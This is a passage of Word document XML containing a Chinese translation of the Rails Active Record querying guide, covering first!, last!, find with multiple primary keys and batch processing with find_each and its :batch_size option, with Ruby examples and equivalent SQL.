        <w:t xml:space="preserve">等价的 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>SQL</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 语句是：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="3551"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="1279ED97" w14:textId="77777777" w:rsidTr="00F53072">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="038B4F9D" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4">
            <w:pPr>
              <w:divId w:val="131681887"/>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LIMIT 1</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="6A9C6C21" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">如果没有找到匹配的记录， </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Model.first!</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 会抛出 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>RecordNotFound</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 异常。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0DED29A0" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="5"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">1.1.5 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>last!</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E62875C" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Model.last!</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 返回第一条记录。比如：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5496"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="4ED96A31" w14:textId="77777777" w:rsidTr="00F53072">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="04EFC305" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>client = Client.last!</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7D194E2F" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t># =&gt; #&lt;Client id: 221, first_name: "Russel"&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="05CBC33B" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">等价的 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>SQL</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 语句是：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6334"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="1AF6B5E6" w14:textId="77777777" w:rsidTr="00F53072">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="750D5159" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4">
            <w:pPr>
              <w:divId w:val="2020086173"/>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ORDER</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>BY</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>clients.id DESC</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>LIMIT 1</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="05AD080F" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">如果没有找到匹配的记录， </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Model.last!</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 会抛出 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>RecordNotFound</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 异常。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A1AD035" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t>1.2 查询多条记录</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51B27A43" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="5"/>
      </w:pPr>
      <w:r>
        <w:t>1.2.1 使用多个主键</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47094397" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Model.find(array_of_primary_key)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 接受一组 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>primary keys</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 作为参数，返回一个包含所有匹配的记录的数组。比如：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="8522"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="22DCA34E" w14:textId="77777777" w:rsidTr="00F53072">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="4972DD3C" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t># 查找主键是 1 或者 10 的 clients 。</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="569E176B" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>client = Client.find([1, 10]) # 甚至可以这样写 Client.find(1, 10)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="09F54ECC" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t># =&gt; [#&lt;Client id: 1, first_name: "Lifo"&gt;, #&lt;Client id: 10, fist_name: "Ryan"&gt;]</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="0571ADD9" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">等价的 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>SQL</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 语句是：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6046"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="765FBA69" w14:textId="77777777" w:rsidTr="00F53072">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="75270E62" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4">
            <w:pPr>
              <w:divId w:val="483199041"/>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WHERE</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>(clients.id in</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>(1, 10))</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="517F553D" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">除非所有的主键都找到匹配的记录，否则 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Model.find(array_of_primary_key)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 将会抛出一个 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>ActiveRecord::RecordNotFound</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 异常。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1CF5F22F" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t>1.3 按组查询多条记录</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2258B391" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>我们经常需要同时处理大量数据，比如说当我们需要实时通知一群用户，或者载入大量数据的时候。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3FED87E2" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>你可能直接这样写：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5616"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="299964B9" w14:textId="77777777" w:rsidTr="00F53072">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="1682CA83" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t># 当 users 这个表有几千条数据时，效率会很低。</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="329FBC29" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>User.all.each</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>do</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>|user|</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3502500E" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  NewsLetter.weekly_deliver(user)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="34C5F6CA" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="7CB9CFAA" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">但是随着表的规模的增大，这种处理方式的时间也会随之增长。因为 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>User.all.each</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 一次性地将整个表都实例化了，为每一条记录生成了一个 model ，并把这个结果数组保存在内存中。其实，当我们有一堆非常巨大的对象时，这个集合将会导致内存溢出。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F60B161" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Rails 提供了两种方法来把记录分割成组进行处理。第一种方法是 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>find_each</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ，检索出一组数据并对将每条记录作为一个 model 传给 block 代码块。第二种方法是 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>find_in_batches</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ，检索出一组数据然后将整组数据作为一个 model 的数组传给 block 代码块。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B81C38F" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">这里的 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>find_each</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 和 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>find_in_batches</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 方法适用于那种大量数据不能够一次加载到内存中的情况分组处理情况。如果你只是想遍历一千条数据，那一般的查找方法会更好。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C381F62" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="5"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">1.3.1 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>find_each</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1018FC06" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">这个 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>find_each</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 方法检索出一组数据并对将每条记录作为一个 model 传给 block 代码块。在下面的例子中， </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>find_each</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 方法会检索出 1000 条数据（当前的 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>find_each</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 和 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>find_in_batches</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 方法的默认值）然后将每条记录作为一个 model 传给 block 代码块。</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4416"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="150385AC" w14:textId="77777777" w:rsidTr="00DE0EFC">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="29892AC1" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>User.find_each do</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>|user|</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0E39E6EA" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  NewsLetter.weekly_deliver(user)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5E5C4658" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="432BD9F2" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">1.3.1.1 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>find_each</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>的参数</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0454F72E" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>find_each</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 方法可以接受除了 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:order</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 和 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:limit</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 之外的普通的 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>find</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 方法的所有参数，因为 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:order</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 和 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:limit</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 参数已用于 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>find_each</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 方法的内部实现了。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A9B4028" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>另外，</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>find_each</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 还可以接受两个额外的参数 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:batch_size</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 和 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:start</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40F90AF5" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>:batch_size</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D263D56" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:batch_size</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 这个参数可以让你在传递给 block 语句块之前指定检索到的每组数据的记录数目。比如说，检索一个 5000 条数据的组：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5471"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="01EE80B4" w14:textId="77777777" w:rsidTr="00DE0EFC">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="2F0BC809" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>User.find_each(:batch_size</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; 5000) do</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>|user|</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7205D928" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  NewsLetter.weekly_deliver(user)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6568D634" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="35CC3DE0" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>:start</w:t>
      </w:r>
    </w:p>
